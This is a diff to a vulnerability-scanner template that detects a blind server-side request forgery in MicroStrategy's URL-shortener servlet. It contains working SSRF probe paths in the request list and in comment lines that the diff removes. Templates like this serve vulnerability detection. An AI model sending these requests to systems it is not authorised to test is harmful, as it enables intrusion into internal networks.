@@ -1,19 +1,23 @@
 id: microstrategy-ssrf
+
 info:
-  name: MicroStrategy tinyurl SSRF
+  name: MicroStrategy tinyurl - Server-Side Request Forgery (Blind)
   author: organiccrap
   severity: high
-  # https://medium.com/@win3zz/how-i-made-31500-by-submitting-a-bug-to-facebook-d31bb046e204
-  # blind ssrf
-  # /servlet/taskProc?taskId=wikiScrapper&taskEnv=xml&taskContentType=xml&searchString=https://SSRF&shouldSuggest=false&publicDataSuggestionURL=&publicDataSearchURL=&publicDataPageURL=
-  # /servlet/taskProc?taskId=validateUsherConfigTask&taskEnv=xml&taskContentType=xml&serverURL=https://SSRF
-requests:
+  description: Blind server-side (SSRF) request forgery vulnerability on MicroStrategy URL shortener.
+  reference:
+    - https://medium.com/@win3zz/how-i-made-31500-by-submitting-a-bug-to-facebook-d31bb046e204
+  metadata:
+    max-request: 2
+  tags: microstrategy,ssrf
+
+http:
   - method: GET
     path:
       - '{{BaseURL}}/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https://google.com'
       - '{{BaseURL}}/MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https://google.com'
-    headers:
-      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+
+    stop-at-first-match: true
     matchers:
       - type: word
         words:
@@ -21,3 +25,5 @@ requests:
           - The source URL is not valid
         condition: and
         part: body
+
+# digest: 4a0a004730450220047271ca78f2a19512060e91534b177d3ebc1202ab0002365e3b1bc8d9dc14f4022100ec1b4ee4f26a42bfd7773118b11ae70445f1f3f182c1312d44ac30f50bc3eee1:922c64590222798bb761d5b6d8e72950
